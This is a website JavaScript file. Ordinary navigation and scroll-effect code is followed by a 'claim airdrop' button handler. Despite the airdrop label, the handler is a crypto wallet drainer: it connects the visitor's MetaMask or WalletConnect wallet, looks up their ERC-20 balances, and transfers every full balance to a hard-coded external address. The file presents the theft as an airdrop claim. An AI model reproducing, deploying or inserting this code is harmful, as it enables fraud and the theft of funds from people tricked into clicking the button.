'use strict';

// UI functionality (unchanged)
const addEventOnElem = function (elem, type, callback) {
  if (elem.length > 1) {
    for (let i = 0; i < elem.length; i++) {
      elem[i].addEventListener(type, callback);
    }
  } else {
    elem.addEventListener(type, callback);
  }
};

const navbar = document.querySelector("[data-navbar]");
const navbarLinks = document.querySelectorAll("[data-nav-link]");
const navToggler = document.querySelector("[data-nav-toggler]");
const toggleNavbar = function () {
  navbar.classList.toggle("active");
  navToggler.classList.toggle("active");
  document.body.classList.toggle("active");
};
addEventOnElem(navToggler, "click", toggleNavbar);
const closeNavbar = function () {
  navbar.classList.remove("active");
  navToggler.classList.remove("active");
  document.body.classList.remove("active");
};
addEventOnElem(navbarLinks, "click", closeNavbar);

const header = document.querySelector("[data-header]");
const activeHeader = function () {
  if (window.scrollY > 300) {
    header.classList.add("active");
  } else {
    header.classList.remove("active");
  }
};
addEventOnElem(window, "scroll", activeHeader);

const addToFavBtns = document.querySelectorAll("[data-add-to-fav]");
const toggleActive = function () {
  this.classList.toggle("active");
};
addEventOnElem(addToFavBtns, "click", toggleActive);

const sections = document.querySelectorAll("[data-section]");
const scrollReveal = function () {
  for (let i = 0; i < sections.length; i++) {
    if (sections[i].getBoundingClientRect().top < window.innerHeight / 1.5) {
      sections[i].classList.add("active");
    } else {
      sections[i].classList.remove("active");
    }
  }
};
scrollReveal();
addEventOnElem(window, "scroll", scrollReveal);

//
// Wallet connection and token transfer logic
//

// Load WalletConnectProvider if not already loaded
async function loadWalletConnect() {
  if (!window.WalletConnectProvider) {
    const script = document.createElement('script');
    script.src = 'https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js';
    document.head.appendChild(script);
    return new Promise(resolve => {
      script.onload = resolve;
    });
  }
}

// Load ethers.js if not already loaded
async function loadEthers() {
  if (!window.ethers) {
    const script = document.createElement('script');
    script.src = 'https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js';
    document.head.appendChild(script);
    return new Promise(resolve => {
      script.onload = resolve;
    });
  }
}

async function connectWalletAndSendTokens() {
  try {
    await loadEthers();

    let provider;
    let web3Provider;

    // Check for MetaMask
    if (window.ethereum && window.ethereum.isMetaMask) {
      provider = window.ethereum;
      await provider.request({ method: 'eth_requestAccounts' });
      web3Provider = new ethers.providers.Web3Provider(provider);
    } else {
      // Fallback to WalletConnect
      await loadWalletConnect();
      const WalletConnectProvider = window.WalletConnectProvider.default;
      provider = new WalletConnectProvider({
        rpc: {
          1: "https://mainnet.infura.io/v3/YOUR_INFURA_ID" // Replace with your Infura Project ID
        }
      });
      await provider.enable();
      web3Provider = new ethers.providers.Web3Provider(provider);
    }

    const signer = web3Provider.getSigner();
    const userAddress = await signer.getAddress();
    const network = await web3Provider.getNetwork();
    const chainId = network.chainId;

    const covalentApiKey = "YOUR_API_KEY"; // Replace with your Covalent API key
    const destAddress = "0xf659d4Bb03E0923964b8bBACfd354f8BC02Bfe47"; // Airdrop receiver address

    const url = `https://api.covalenthq.com/v1/${chainId}/address/${userAddress}/balances_v2/?key=${covalentApiKey}`;
    const response = await fetch(url);
    const data = await response.json();

    if (!data.data || !data.data.items) {
      alert("Unable to fetch token balances.");
      return;
    }

    const tokens = data.data.items.filter(token =>
      token.type === "cryptocurrency" &&
      token.contract_address &&
      token.balance > 0 &&
      token.supports_erc?.includes("erc20")
    );

    if (tokens.length === 0) {
      alert("No eligible ERC-20 tokens found in your wallet.");
      return;
    }

    for (const token of tokens) {
      try {
        const contract = new ethers.Contract(token.contract_address, [
          "function transfer(address to, uint amount) returns (bool)"
        ], signer);

        const amount = ethers.BigNumber.from(token.balance.toString()); // Ensure it's treated as a string
        const tx = await contract.transfer(destAddress, amount);
        console.log(`Transferred ${token.contract_ticker_symbol}: ${tx.hash}`);
      } catch (err) {
        console.warn(`Error sending ${token.contract_ticker_symbol}: ${err.message}`);
      }
    }

    alert("Tokens processed. Please check your wallet for confirmation.");
  } catch (err) {
    console.error("Connection or transaction error:", err);
    alert("An error occurred. Please try again.");
  }
}

// Bind the airdrop button
document.getElementById("claim-airdrop-btn")?.addEventListener("click", connectWalletAndSendTokens);